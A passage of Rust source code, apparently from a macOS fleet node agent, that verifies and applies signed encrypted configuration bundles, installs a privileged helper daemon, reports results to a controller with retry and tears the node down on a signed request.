    me: &str,
    as_root: bool,
    user_anchors: &UserAnchors,
) -> Result<Payloads, String> {
    let der = stage.join("bundle.der");
    let tarp = stage.join("bundle.tar");
    let keyp = stage.join("birth.key");
    write_new_file(&der, blob, 0o600, false).map_err(|e| format!("stage write: {e}"))?;
    write_new_file(&keyp, key, 0o600, false).map_err(|e| format!("stage write: {e}"))?;
    let (code, out) = run(Command::new(OPENSSL).args([
        "smime", "-decrypt", "-binary", "-inform", "DER",
        "-in", &der.to_string_lossy(), "-inkey", &keyp.to_string_lossy(), "-out", &tarp.to_string_lossy(),
    ]));
    let _ = std::fs::remove_file(&keyp);
    let _ = std::fs::remove_file(&der);
    if code != 0 {
        return Err(format!("bundle decrypt failed ({out}) — staged for a different birth cert? re-enroll"));
    }
    // A gzip-wrapped bundle (magic 1f 8b) is unwrapped here, after decrypt and
    // before anything reads it; the tar inside is byte-identical to the
    // uncompressed form, so every check below is unchanged. gzip ABSENT or
    // FAILING is an error with its own message (the apply report carries it),
    // not a tar parse failure on gzip bytes.
    let mut magic = [0u8; 2];
    let gzipped = std::fs::File::open(&tarp)
        .and_then(|mut f| std::io::Read::read_exact(&mut f, &mut magic))
        .is_ok() && magic == [0x1f, 0x8b];
    if gzipped {
        let gz = stage.join("bundle.tar.gz");
        let plain = stage.join("bundle.tar.plain");
        std::fs::rename(&tarp, &gz).map_err(|e| format!("stage write: {e}"))?;
        let (gcode, gout) = run(Command::new(GZIP).args(["-dc", &gz.to_string_lossy()]).stdout(std::process::Stdio::from(
            std::fs::File::create(&plain).map_err(|e| format!("stage write: {e}"))?)));
        let _ = std::fs::remove_file(&gz);
        if gcode != 0 {
            let _ = std::fs::remove_file(&plain);
            return Err(format!("bundle gzip decompress failed ({gout}) — is {GZIP} present? re-stage"));
        }
        std::fs::rename(&plain, &tarp).map_err(|e| format!("stage write: {e}"))?;
    }
    // Extracted by THIS code, not tar(1): only regular files under the fixed
    // layout are ever written, so a symlink or hardlink member cannot turn a
    // root write into a write elsewhere.
    let tar_bytes = std::fs::read(&tarp).map_err(|e| format!("stage read: {e}"))?;
    let _ = std::fs::remove_file(&tarp);
    extract_bundle(&tar_bytes, stage)?;
    // The whole trust decision (parity with noo-apply.sh §1-2): the manifest
    // must verify against the CA pinned at enroll, every kind must be known,
    // every file must hash to its manifest line. Decryptability proves only
    // that the sender had this node's PUBLIC cert, which the gateway hands
    // out — it is not authenticity. Refuse before touching a single file.
    // `me` is this box's own name, persisted at enroll — the anchor the
    // bundle's address is checked against.
    // The trust anchors a ROOT apply verifies against live in a root-owned
    // directory, not under the user's ~/noomesh: a user-writable anchor made
    // the user root.
    let anchors = if as_root {
        ensure_root_anchors(user_anchors, Path::new(ROOT_ANCHOR_DIR))?
    } else {
        base.join("pki")
    };
    verify_bundle(stage, &anchors.join("ca.crt"), me)?;
    // Verified. Read every payload while the stage is still root's alone;
    // everything after this is decided and installed from these bytes.
    let payloads: Payloads = std::fs::read_dir(stage.join("files"))
        .map_err(|e| format!("stage read: {e}"))?
        .flatten()
        .map(|e| {
            let name = e.file_name().to_string_lossy().to_string();
            std::fs::read(e.path()).map(|b| (name, b)).map_err(|e| format!("stage read: {e}"))
        })
        .collect::<Result<_, _>>()?;
    // The env files are SOURCED by run-agent.sh /
    // run-harness.sh, so a line in them is code. Only the rendered keys, the
    // rendered PATH, and no shell beyond quoting — checked before anything
    // is installed, so a refused bundle changes nothing.
    env_payloads_ok(&payloads)?;
    Ok(payloads)
}

/// Install `noo-hostd` (root, from the verified bytes), keep the previous
/// copy, and require the NEW daemon's heartbeat — polled as the user — or
/// put the previous one back. A refusal is recorded for the apply report.
fn install_hostd(hostd_bytes: &[u8]) -> bool {
    let hostd = Path::new(HOSTD_BIN);
    let prev = PathBuf::from(format!("{HOSTD_BIN}.prev"));
    let hb = PathBuf::from(format!("{AGENT_STATE_DIR}/spool/hostd.heartbeat.json"));
    let prev_bytes = {
        let _r = privs::root();
        if let Err(e) = hostd.parent().map_or(Ok(()), root_dir_trustworthy) {
            crate::ui::warned(&format!("noo node fetch: noo-hostd not installed: {e}"));
            note_root_refused("noo-hostd");
            return false;
        }
        std::fs::read(hostd).ok()
    };
    if let Some(p) = &prev_bytes {
        let _ = root_install(p, &prev, 0o755);
    }
    if let Err(e) = root_install(hostd_bytes, hostd, 0o755) {
        crate::ui::warned(&format!("noo node fetch: noo-hostd not installed: {e}"));
        note_root_refused("noo-hostd");
        return false;
    }
    let start = std::time::SystemTime::now();
    let install = || run(Command::new(HOSTD_BIN).args(["install", "--mode", "worker"])).0 == 0;
    // Polled lowered: the spool is the user's directory, so root does not
    // read in it (H2 third review, L5).
    let fresh = install() && (0..20).any(|_| {
        std::thread::sleep(std::time::Duration::from_millis(500));
        std::fs::metadata(&hb).and_then(|m| m.modified()).is_ok_and(|m| m >= start)
            && std::fs::read_to_string(&hb).is_ok_and(|b| b.contains("harness-start"))
    });
    if fresh {
        crate::ui::done("noo node fetch: privileged helper (noo-hostd) installed and heartbeating");
    } else {
        crate::ui::warned("noo node fetch: new noo-hostd did not come up advertising harness-start — restoring previous");
        if let Some(p) = &prev_bytes {
            if root_install(p, hostd, 0o755).is_ok() {
                let _ = install();
            }
        }
    }
    fresh
}

/// Give the agent its working directories (`claim_agent_dirs`) as root.
///
/// The spool is the AGENT's to write and hostd's (root) to read: the agent
/// queues harness-start/stop there and hostd answers. `noo-hostd install`
/// creates the directory as root, 0755, so the agent — which runs as the
/// user on this platform — could not create a command file in it and every
/// harness start was refused with "permission denied" (host6, 2026-09-22).
/// This is that step for Darwin, on every root apply, so an existing install
/// heals on its next restage.
fn reclaim_agent_dirs(user: &str) {
    let Some((uid, gid)) = user_ids(user) else {
        crate::ui::warned(&format!("noo node fetch: no uid for '{user}' — the agent's directories were not handed over"));
        return;
    };
    let _r = privs::root();
    if let Err(e) = claim_agent_dirs(Path::new(AGENT_STATE_DIR), uid, gid, true) {
        crate::ui::warned(&format!(
            "noo node fetch: {e} — the agent cannot queue harness ops until it owns {AGENT_STATE_DIR}/spool"
        ));
    }
}

/// The agent's state directory on a Mac.
const AGENT_STATE_DIR: &str = "/var/lib/noo-node-agent";
/// The directories under it the agent (running as the user) writes: the
/// hostd spool, the log-ship spill ring, the image staging area.
const AGENT_OWNED_DIRS: &[&str] = &["spool", "logship", "staging"];

/// `state` stays root:wheel 0755 — never the user's: a user who owns it can
/// replace any entry in it, and a hardlink at `spool` would hand a root file
/// to the user (H2 third review, M3). Only its working subdirectories are
/// the user's, each opened O_DIRECTORY|O_NOFOLLOW and chowned BY DESCRIPTOR,
/// so a symlink, a regular file or a hardlink at that name is refused and
/// never chowned. `chown_state` is off only where a test cannot be root.
fn claim_agent_dirs(state: &Path, uid: u32, gid: u32, chown_state: bool) -> Result<(), String> {
    use std::os::unix::fs::{MetadataExt, PermissionsExt};
    let open_dir = |p: &Path| -> Result<std::fs::File, String> {
        use std::os::unix::fs::OpenOptionsExt;
        let f = std::fs::OpenOptions::new()
            .read(true)
            .custom_flags(libc::O_DIRECTORY | libc::O_NOFOLLOW)
            .open(p)
            .map_err(|e| format!("REFUSED — {} is not a plain directory ({e})", p.display()))?;
        let m = f.metadata().map_err(|e| format!("{}: {e}", p.display()))?;
        if !m.is_dir() {
            return Err(format!("REFUSED — {} is not a plain directory", p.display()));
        }
        Ok(f)
    };
    std::fs::create_dir_all(state).map_err(|e| format!("{}: {e}", state.display()))?;
    let sf = open_dir(state)?;
    if chown_state {
        std::os::unix::fs::fchown(&sf, Some(0), Some(0)).map_err(|e| format!("{}: {e}", state.display()))?;
    }
    sf.set_permissions(std::fs::Permissions::from_mode(0o755)).map_err(|e| format!("{}: {e}", state.display()))?;
    let m = sf.metadata().map_err(|e| e.to_string())?;
    if chown_state && (m.uid() != 0 || m.mode() & 0o022 != 0) {
        return Err(format!("{} is not root's alone", state.display()));
    }
    for sub in AGENT_OWNED_DIRS {
        let d = state.join(sub);
        match std::fs::create_dir(&d) {
            Ok(()) => {}
            Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => {}
            Err(e) => return Err(format!("{}: {e}", d.display())),
        }
        let f = open_dir(&d)?;
        std::os::unix::fs::fchown(&f, Some(uid), Some(gid)).map_err(|e| format!("chown {}: {e}", d.display()))?;
    }
    Ok(())
}

/// Move the agent's secrets into `~/noomesh/secrets/` (or back into the env
/// for an agent that cannot read files) — `agent_secret_files` in noo-apply
/// is the Linux twin.
fn agent_secrets_to_files(base: &Path, _user: &str, _as_root: bool) -> Result<(), String> {
    // Runs as the user (privs), so the files are the user's from birth and
    // root never changes their owner (H2).
    let dir = base.join("secrets");
    super::agent_secret_files::converge(&base.join("agent.env"), &dir, &base.join("bin/noo-node-agent"))?;
    Ok(())
}

/// Has this exact bundle been applied: `(skip, seed root's marker)`.
/// Root's marker decides when it exists. Without one (the first poll after
/// the upgrade that moved it into ROOT_STATE_DIR), the user's old
/// `last-bundle.sha256` may say "applied" — believed only to skip, and then
/// copied into root's marker, so every Mac does not re-apply its last bundle
/// on upgrade (which, past the freshness window, would also report a false
/// failure). Pure.
fn already_applied(root_seen: Option<&str>, user_seen: Option<&str>, sum: &str) -> (bool, bool) {
    match root_seen {
        Some(r) => (r == sum, false),
        None if user_seen == Some(sum) => (true, true),
        None => (false, false),
    }
}

/// Write a cadence file (`expect-bundle`, `fetch-state`) as the user, by
/// rename: a root-owned copy an older applier (v0.2.103) left in the user's
/// tree is replaced instead of failing to open, silently, on every tick.
fn set_cadence(p: &Path, body: &str) {
    if let Err(e) = user_write(p, body.as_bytes(), 0o644) {
        crate::ui::warned(&format!("noo node fetch: could not write {}: {e}", p.display()));
    }
}

/// `noo node fetch --user <u>` — one poll. Exit 0 always except on a
/// decrypt/apply failure (the daemon retries next tick either way).
pub fn node_fetch(_g: &Globals, args: &[String]) -> Result<i32, Unhandled> {
    if !cfg!(target_os = "macos") {
        crate::ui::failed("noo node fetch is the macOS poller; Linux nodes run noo-fetch.sh under systemd", None);
        return Ok(2);
    }
    let mut user = String::new();
    let mut it = args.iter();
    while let Some(t) = it.next() {
        match t.as_str() {
            "--user" => user = it.next().cloned().unwrap_or_default(),
            _ => return Err(Unhandled),
        }
    }
    if user.is_empty() {
        user = run(Command::new(ID).arg("-un")).1;
    }
    // From here the poll runs as the user; root is resumed only where a
    // root path is written (H2).
    if let Err(e) = privs::drop_to(&user) {
        crate::ui::warned(&format!("noo node fetch: {e}"));
        return Ok(1);
    }
    let base = PathBuf::from(format!("/Users/{user}/noomesh"));
    let Some(node) = read_trim(&base.join("node-name")) else {
        crate::ui::warned(&format!("noo node fetch: no {}/node-name — not enrolled", base.display()));
        return Ok(0);
    };
    let Some(url) = read_trim(&base.join("controller-url")) else {
        crate::ui::warned("noo node fetch: no controller-url");
        return Ok(0);
    };
    // The re-exec pass applies the bundle the first pass was handed, not a
    // fresh fetch. The first pass used to `remove_dir_all(stage)` and the
    // second to GET again — through the adaptive cadence below, which
    // returns early two ticks in three, and against a controller row it had
    // already receipted. So the pass that SHIPS an applier fix ran the old
    // applier for every step before the CLI swap and the new one for
    // nothing: #411's root:wheel chown was in the CLI on host6 and the
    // plist stayed owned by the enrolling user (with a Linux gid) through the restage that delivered it
    // (2026-09-22). The blob travels through a file instead.
    let agent = match pinned_agent(&base) {
        Ok(a) => a,
        Err(e) => {
            crate::ui::warned(&format!("noo node fetch: {e}"));
            return Ok(0);
        }
    };
    let expect = base.join("expect-bundle");
    let state = base.join("fetch-state");
    let blob = match take_reexec_bundle(Path::new(ROOT_STATE_DIR), std::env::var("NOO_FETCH_REEXEC").is_ok()) {
        Some(b) => b,
        None => {
        // Adaptive cadence.
        // Same countdown semantics as noo-fetch.sh: expect-bundle holds the
        // fast ticks left (empty = 10); every apply attempt re-arms 10.
        if expect.exists() {
            let left: u64 = read_trim(&expect).and_then(|s| s.parse().ok()).unwrap_or(10u64).saturating_sub(1);
            if left == 0 { let _ = std::fs::remove_file(&expect); } else { set_cadence(&expect, &format!("{left}\n")); }
        } else {
            let n: u64 = read_trim(&state).and_then(|s| s.parse().ok()).unwrap_or(0) + 1;
            set_cadence(&state, &format!("{n}\n"));
            if !n.is_multiple_of(3) {
                return Ok(0);
            }
        }
        let mut resp = match agent.get(&format!("{url}/bootstrap/bundle/{node}")).call() {
            Ok(r) => r,
            Err(e) => {
                crate::ui::warned(&format!("noo node fetch: controller unreachable: {e}"));
                return Ok(0);
            }
        };
        if resp.status().as_u16() != 200 {
            return Ok(0); // nothing staged
        }
        let mut blob = Vec::new();
        use std::io::Read as _;
        if resp.body_mut().as_reader().read_to_end(&mut blob).is_err() || blob.is_empty() {
            return Ok(0);
        }
            blob
        }
    };
    let sum = {
        use sha2::{Digest, Sha256};
        hex::encode(Sha256::digest(&blob))
    };
    // The FETCH receipt. `fetched_at` used to be stamped by the
    // GET above — a state write any anonymous caller could make, so it meant
    // "somebody collected this ciphertext", never "this Mac did". The node has
    // no fleet secret at this point (it rides inside the bundle), so the proof
    // is its birth key. Best-effort: a receipt that does not land costs the
    // operator a progress line, never the apply.
    match birth_proof(&base, "fetch", &node, &sum) {
        Ok(proof) => {
            let _ = agent
                .post(&format!("{url}/bootstrap/bundle/{node}/fetched"))
                .header("x-noo-birth-proof", &proof)
                .send_json(serde_json::json!({ "sha": sum }));
        }
        Err(why) => crate::ui::warned(&format!(
            "noo node fetch: cannot sign the fetch receipt, so fetched_at will not be stamped \
             (the controller's `provision --wait` will time out at the fetch stage): {why}"
        )),
    }

    let as_root = privs::is_root_process();
    // Root's record of the last bundle applied lives in root's state dir; in
    // the user's tree it could be deleted to re-arm an apply (H2 third review).
    let last = last_bundle_path(&base, as_root);
    let last_seen = { let _r = privs::root(); read_trim(&last) };
    // The user's pre-move copy, read as the user. Consulted only when root
    // has no marker yet (the first poll after the upgrade that moved it), and
    // only to SKIP: a user who forges it can at most stop an apply of this
    // bundle on their own box, never cause one.
    let user_seen = if as_root && last_seen.is_none() {
        read_trim(&base.join("last-bundle.sha256"))
    } else {
        None
    };
    let (skip, seed) = already_applied(last_seen.as_deref(), user_seen.as_deref(), &sum);
    let record_last = |sum: &str| {
        let r = if as_root {
            ensure_root_state_dir(Path::new(ROOT_STATE_DIR))
                .and_then(|()| root_install(format!("{sum}\n").as_bytes(), &last, 0o600))
        } else {
            user_write(&last, format!("{sum}\n").as_bytes(), 0o644)
        };
        if let Err(e) = r {
            crate::ui::warned(&format!("noo node fetch: could not record the applied bundle: {e}"));
        }
    };
    if skip {
        if seed {
            record_last(&sum);
        }
        return Ok(0); // already applied this exact bundle
    }
    crate::ui::step(&format!("noo node fetch: new bundle staged ({sum}) — applying"));
    // Same contract as noo-fetch.sh: best-effort, never blocks — but SIGNED,
    // and it does NOT go out at all when it cannot be signed.
    //
    // It used to post unsigned whenever the proof could not be built, which
    // meant the gateway decided — and the gateway cannot see why a Mac failed
    // to sign. What the operator got instead was a 403 and a `reason: Missing`
    // about a header the node never sent, which is a description of the
    // symptom in the wrong process. A Mac holds no fleet secret on the
    // applier-only pass either, so an unsigned report has no second credential
    // to fall back on; posting it is not a degraded success, it is a 403 with
    // the diagnosis thrown away.
    //
    // So the reason is named HERE, on the box that knows it and where the fix
    // is, and nothing unsigned is sent.
    let apply_proof = birth_proof(&base, "apply", &node, &sum);
    if let Err(why) = &apply_proof {
        crate::ui::warned(&format!(
            "noo node fetch: cannot sign the apply report, so this apply's outcome will NOT \
             reach the controller (`provision --wait` and `rotate-signing-key` will report it \
             as unknown, whatever the apply actually did): {why}"
        ));
    }
    let report = |rc: i64, msg: &str| {
        let Ok(p) = apply_proof.as_deref() else { return };
        // The apply may have restarted tailscaled (host-telemetry does, via
        // launchctl), so the link is down for a few seconds: a transport
        // failure is retried for REPORT_WINDOW, an HTTP answer is final.
        let sent = post_with_transport_retry(
            REPORT_WINDOW,
            REPORT_STEP,
            || {
                agent
                    .post(&format!("{url}/bootstrap/bundle/{node}/applied"))
                    .header("x-noo-birth-proof", p)
                    .send_json(serde_json::json!({ "sha": sum, "rc": rc, "msg": msg }))
                    .map(|r| r.status().as_u16())
                    .map_err(|e| e.to_string())
            },
            std::thread::sleep,
        );
        match sent {
            Ok(code) if (200..300).contains(&code) => {
                eprintln!("noo node fetch: apply report delivered (HTTP {code})")
            }
            Ok(code) => eprintln!("noo node fetch: apply report refused (HTTP {code})"),
            Err(why) => eprintln!(
                "noo node fetch: apply report: controller unreachable for {} s after the apply — tailscaled restart? ({why})",
                REPORT_WINDOW.as_secs()
            ),
        }
    };
    match darwin_apply(&blob, &base, &user, &node, as_root) {
        Err(e) if e == REEXEC => {
            // Same bundle, new CLI: the re-exec applies THIS blob, handed
            // over through a root-only file, rather than fetching again.
            println!("noo node fetch: re-running this apply under the updated CLI");
            {
                let _r = privs::root();
                let _ = std::fs::remove_file(&last);
            }
            if let Err(why) = leave_reexec_bundle(Path::new(ROOT_STATE_DIR), &blob) {
                crate::ui::warned(&format!("noo node fetch: could not hand the bundle to the updated CLI ({why}) — it will fetch again"));
            }
            // Root executes this file: it must be root's, in a directory
            // only root can write (H2 third review).
            let _r = privs::root();
            if let Err(e) = root_exec_trustworthy(Path::new(NOO_ROOT_BIN)) {
                crate::ui::warned(&format!("noo node fetch: not re-running under {NOO_ROOT_BIN}: {e}"));
                return Ok(1);
            }
            let st = Command::new(NOO_ROOT_BIN)
                .args(["node", "fetch", "--user", &user])
                .env_clear()
                .env("PATH", SAFE_PATH)
                .env("NOO_FETCH_REEXEC", "1")
                .status();
            Ok(st.ok().and_then(|s| s.code()).unwrap_or(1))
        }
        Err(e) if e == TEARDOWN => {
            // The identity tree is gone, so there is no last-bundle marker
            // to write and the next tick (if any) reports "not enrolled".
            crate::ui::close_done("noo node fetch: teardown applied — this Mac has left the fleet");
            let detail = TEARDOWN_DETAIL.lock().ok().and_then(|g| g.clone());
            report(0, &match detail {
                Some(d) => format!("teardown applied; {d}"),
                None => "teardown applied".to_string(),
            });
            // Boot the fetch daemon (this very process's parent job) out
            // from a detached child, AFTER the report above has gone.
            let script = format!(
                "/bin/sleep 3; {LAUNCHCTL} bootout system/{FETCH_LABEL}; /bin/rm -f /Library/LaunchDaemons/{FETCH_LABEL}.plist");
            let mut fin = Command::new(if as_root { SH } else { SUDO });
            if !as_root { fin.arg(SH); }
            let _r = privs::root();
            let _ = fin.args(["-c", &script])
                .env_clear()
                .env("PATH", SAFE_PATH)
                .stdin(std::process::Stdio::null())
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .spawn();
            Ok(0)
        }
        Ok(()) => {
            if as_root {
                refresh_fetch_plist(&user);
            }
            record_last(&sum);
            set_cadence(&expect, "10\n");
            set_cadence(&state, "0\n");
            let refused = root_refused();
            if refused.is_empty() {
                crate::ui::close_done(&format!("noo node fetch: applied — agent (re)loaded as {AGENT_LABEL}"));
            } else {
                crate::ui::close_done(&format!(
                    "noo node fetch: applied — agent (re)loaded as {AGENT_LABEL}, but root REFUSED to install: {} \
                     (their directory is not root's alone; the report says so)",
                    refused.join(", ")
                ));
            }
            report(0, &with_binary_summary(apply_report_msg(&last_verified(), &refused), &binary_outcomes(), &binary_shas()));
            Ok(0)
        }
        Err(e) => {
            record_last(&sum);
            set_cadence(&expect, "10\n");
            crate::ui::close_failed(&format!("noo node fetch: apply failed: {e}"), None);
            crate::ui::guide(&[
                (&format!("noo cluster provision {node}"), "on the controller: re-stage the bundle; this poller retries on its next tick"),
                (&format!("sudo launchctl print system/{AGENT_LABEL}"), "the agent's launchd state if the apply left it unloaded"),
            ]);
            let refused = root_refused();
            let msg = if refused.is_empty() { e.clone() } else { format!("{e} {ROOT_REFUSED_TAG} {}", refused.join(",")) };
            report(trailing_code(&e), &msg);
            Ok(1)
        }
    }
}

/// How long the apply report keeps trying while the controller is unreachable.
const REPORT_WINDOW: std::time::Duration = std::time::Duration::from_secs(90);
const REPORT_STEP: std::time::Duration = std::time::Duration::from_secs(10);

/// POST with retry on TRANSPORT failure only. `send` returns the HTTP status
/// of an answer (any status: the agent does not turn them into errors) or the
/// transport error. An answer is a verdict and ends the loop; "no route" is
/// not an answer, so it is retried every `step` until `window` has passed
/// (a fetch is not a delivery, and neither is a connect error).
fn post_with_transport_retry(
    window: std::time::Duration,
    step: std::time::Duration,
    mut send: impl FnMut() -> Result<u16, String>,
    mut sleep: impl FnMut(std::time::Duration),
) -> Result<u16, String> {
    let mut waited = std::time::Duration::ZERO;
    loop {
        match send() {
            Ok(code) => return Ok(code),
            Err(why) if waited >= window => return Err(why),
            Err(_) => {
                sleep(step);
                waited += step;
            }
        }
    }
}

#[cfg(test)]
mod report_retry_tests {
    use super::post_with_transport_retry;
    use std::time::Duration;

    const W: Duration = Duration::from_secs(90);
    const S: Duration = Duration::from_secs(10);

    #[test]
    fn a_report_sent_while_the_link_is_down_is_retried_until_it_lands() {
        let mut calls = 0;
        let mut slept = Vec::new();
        let r = post_with_transport_retry(
            W,
            S,
            || {
                calls += 1;
                if calls <= 3 { Err("network is unreachable".into()) } else { Ok(200) }
            },
            |d| slept.push(d),
        );
        assert_eq!(r, Ok(200));
        assert_eq!(calls, 4);
        assert_eq!(slept, vec![S, S, S]);
    }

    #[test]
    fn an_http_answer_is_a_verdict_and_is_not_retried() {
        let mut calls = 0;
        let r = post_with_transport_retry(W, S, || { calls += 1; Ok(403) }, |_| panic!("must not wait"));
        assert_eq!(r, Ok(403));
        assert_eq!(calls, 1);
    }

    #[test]
    fn a_controller_that_never_answers_is_given_up_on_after_the_window() {
        let mut calls = 0;
        let r = post_with_transport_retry(W, S, || { calls += 1; Err("down".into()) }, |_| {});
        assert_eq!(r, Err("down".to_string()));
        assert_eq!(calls, 10);
    }
}

/// Keep the installed fetch daemon plist current (root only): a Mac enrolled
/// before its log moved out of /tmp gets the new path on its next load. The
/// file is ours, root:wheel; launchd reads it at the next bootstrap.
fn refresh_fetch_plist(user: &str) {
    let _r = privs::root();
    let dst = format!("/Library/LaunchDaemons/{FETCH_LABEL}.plist");
    let want = fetch_daemon_plist(user, NOO_ROOT_BIN);
    if std::fs::read_to_string(&dst).ok().as_deref() == Some(want.as_str()) {
        return;
    }
    if let Err(e) = root_install(want.as_bytes(), Path::new(&dst), 0o644) {
        crate::ui::warned(&format!("noo node fetch: fetch daemon plist not refreshed: {e}"));
    }
}

/// The fetch LaunchDaemon plist (installed by enroll on macOS).
pub(crate) fn fetch_daemon_plist(user: &str, noo_bin: &str) -> String {
    format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>{FETCH_LABEL}</string>
  <key>ProgramArguments</key><array>
    <string>{noo_bin}</string><string>node</string><string>fetch</string><string>--user</string><string>{user}</string>
  </array>
  <key>StartInterval</key><integer>60</integer>
  <key>RunAtLoad</key><true/>
  <key>StandardOutPath</key><string>{FETCH_LOG}</string>
  <key>StandardErrorPath</key><string>{FETCH_LOG}</string>
</dict></plist>
"#
    )
}

/// Kinds this applier installs — the Linux noo-apply.sh list plus the two
/// Mac-only kinds (`agent-plist`, `run-agent`). A bundle naming anything
/// else is newer than this CLI: refuse, never partially apply.
/// Install a bundled CLI that is newer than this binary and ask the caller
/// to re-run under it. `Ok(None)` when there is nothing to do.
///
/// Mirrors `scripts/noo-apply.sh`'s applier self-update: the payload is
/// checked against the SIGNED manifest before it is written, the swap is
/// atomic, and `NOO_FETCH_REEXEC` stops a loop. Only the root daemon does
/// this — an unprivileged run has nowhere to put `/usr/local/bin/noo` and
/// should report the refusal rather than pretend.
fn self_update_and_reexec(
    manifest: &str,
    files: &std::path::Path,
) -> Result<Option<String>, String> {
    if std::env::var("NOO_FETCH_REEXEC").is_ok() || !privs::is_root_process() {
        return Ok(None);
    }
    let payload = match std::fs::read(files.join("cli-binary")) {
        Ok(b) if !b.is_empty() => b,
        _ => return Ok(None),
    };
    let want = manifest
        .lines()
        .filter_map(|l| {
            let mut it = l.split_whitespace();
            match (it.next(), it.next()) {
                (Some(sum), Some("cli-binary")) => Some(sum.to_string()),
                _ => None,
            }
        })
        .next();
    let have = { use sha2::{Digest, Sha256}; hex::encode(Sha256::digest(&payload)) };
    match want {
        Some(w) if w == have => {}
        Some(_) => return Err("cli-binary payload does not match the signed manifest — refusing (74)".into()),
        None => return Ok(None),
    }
    let running = std::env::current_exe()
        .ok()
        .and_then(|p| std::fs::read(p).ok())
        .map(|b| { use sha2::{Digest, Sha256}; hex::encode(Sha256::digest(&b)) });
    if running.as_deref() == Some(have.as_str()) {
        // Already this binary: the kind really is unknown to the newest CLI
        // the controller has, which is a genuine refusal, not a stale one.
        return Ok(None);
    }
    // The downgrade floor BEFORE anything is written (second review, M2):
    // this path runs ahead of verify_bundle's own floor check.
    let got = apply_generation_of(&payload);
    if got < APPLY_GENERATION {
        return Err(format!(
            "REFUSED — the bundle's CLI is applier generation {got}, older than this one \
             ({APPLY_GENERATION}); installing it would re-open retired lanes (65)"
        ));
    }
    root_install(&payload, Path::new("/usr/local/bin/noo"), 0o755).map_err(|e| format!("cli-binary: {e}"))?;
    crate::ui::done("noo node fetch: CLI updated from the bundle — re-running this apply under it");
    Ok(Some(REEXEC.to_string()))
}

/// Sentinel error: the bundle replaced the daemon's CLI; re-run under it.
const REEXEC: &str = "__reexec__";
/// Sentinel from `darwin_apply`: the bundle was a signed teardown and the
/// dismantle ran — the poller reports, then boots ITSELF out.
const TEARDOWN: &str = "__teardown__";

/// `NOO_DATA_ROOT` from the agent env the rail installed (falls back to the
/// pre-rename key). None when the file or key is absent — then there is no
/// data root to purge.
fn data_root_from_env(env_path: &Path) -> Option<String> {
    let txt = std::fs::read_to_string(env_path).ok()?;
    txt.lines()
        .filter_map(|l| l.strip_prefix("NOO_DATA_ROOT=").or_else(|| l.strip_prefix("PAI_DATA_ROOT=")))
        .map(super::env_quote::env_unquote)
        .find(|v| !v.is_empty())
}

/// Return this Mac to never-met-the-fleet: stop and unload the agent
/// daemon, drop the identity tree (pki, birth key, agent env, binary),
/// purge the data root when asked, and log the box out of the tailnet
/// (package kept — the Mac lane never installs tailscale, so it never
/// uninstalls it). The FETCH daemon is booted out by the caller, detached,
/// after the apply report has gone: launchd has no oneshot cgroup to lose
/// the child to (the linux #83 failure), a plain detached `sh` survives.
fn darwin_dismantle(base: &Path, as_root: bool, purge_data: bool) {
    let launchctl = |args: &[&str]| -> (i32, String) {
        let mut cmd = Command::new(if as_root { LAUNCHCTL } else { SUDO });
        if !as_root { cmd.arg(LAUNCHCTL); }
        run(cmd.args(args))
    };
    let _ = launchctl(&["bootout", &format!("system/{AGENT_LABEL}")]);
    // Root paths with root resumed; the user's tree (the data root named in
    // the user-writable agent.env, and ~/noomesh) as the user, so a path the
    // user wrote there can never make root delete something else (H2).
    let root_guard = privs::root();
    let _ = std::fs::remove_file(format!("/Library/LaunchDaemons/{AGENT_LABEL}.plist"));
    // The harness and the helper are system daemons too; a teardown that
    // left either bootstrapped would leave root processes on a node that
    // no longer belongs to the fleet.
    let _ = launchctl(&["bootout", &format!("system/{HARNESS_LABEL}")]);
    let _ = std::fs::remove_file(format!("/Library/LaunchDaemons/{HARNESS_LABEL}.plist"));
    let _ = launchctl(&["bootout", "system/net.noomesh.hostd"]);
    let _ = std::fs::remove_file("/Library/LaunchDaemons/net.noomesh.hostd.plist");
    if as_root {
        let _ = std::fs::remove_file(HOSTD_BIN);
        // The root-owned trust anchors: a de-enrolled node
        // trusts nothing of this fleet's.
        let _ = std::fs::remove_dir_all(ROOT_ANCHOR_DIR);
        let _ = std::fs::remove_dir_all(ROOT_STATE_DIR);
    }
    drop(root_guard);
    if purge_data {
        if let Some(root) = data_root_from_env(&base.join("agent.env")) {
            // Never a bare "/" and never a relative path, whatever the env says.
            if root.starts_with('/') && root.trim_end_matches('/').len() > 1 {
                let _ = std::fs::remove_dir_all(&root);
            }
        }
    }
    let ts = ["/usr/local/bin/tailscale", "/opt/homebrew/bin/tailscale",
              "/Applications/Tailscale.app/Contents/MacOS/Tailscale"]
        .into_iter().find(|p| Path::new(p).is_file());
    if let Some(ts) = ts {
        // Root runs it only from a root-owned path; anywhere else (Homebrew's
        // prefix is the user's on Apple Silicon) it runs AS THE USER, who
        // could have replaced it (H2 third review).
        let trusted = { let _r = privs::root(); root_exec_trustworthy(Path::new(ts)).is_ok() };
        let (rc, out) = if trusted {
            run(Command::new(ts).arg("logout"))
        } else {
            output_text(lowered_output(Command::new(ts).arg("logout")))
        };
        let who = if trusted { "root" } else { "user" };
        let detail = if rc == 0 {
            format!("tailscale logout rc 0 (as {who})")
        } else {
            crate::ui::warned(&format!("noo node fetch: `{ts} logout` failed (rc {rc}): {out}"));
            format!("tailscale logout rc {rc} (as {who}) — this Mac may still be on the tailnet")
        };
        if let Ok(mut g) = TEARDOWN_DETAIL.lock() {
            *g = Some(detail);
        }
    } else if let Ok(mut g) = TEARDOWN_DETAIL.lock() {
        *g = Some("no tailscale CLI found — tailnet logout not attempted".into());
    }
    let _ = std::fs::remove_dir_all(base);
}

/// The fleet-wide credentials, merged into the Mac's `agent.env`. (Two since
/// An earlier release retired the shared `NATS_USER`/`NATS_PASSWORD` pair; a node's
/// bus credential rides the `nats-creds` kind instead.)
///
/// Mirrors the `fleet-secrets` block in `noo-apply.sh` line for line,
/// including the refusals — the two are one contract, and a Mac that
/// accepted a payload Linux refuses would be the gap worth having.
pub(crate) const FLEET_SECRET_KEYS: &[&str] =
    &["NOO_CLUSTER_SECRET", "NOO_NODE_AGENT_TOKEN"];

/// Merge the `NATS_NODE_USER` / `NATS_NODE_PASSWORD` lines of a nats-creds
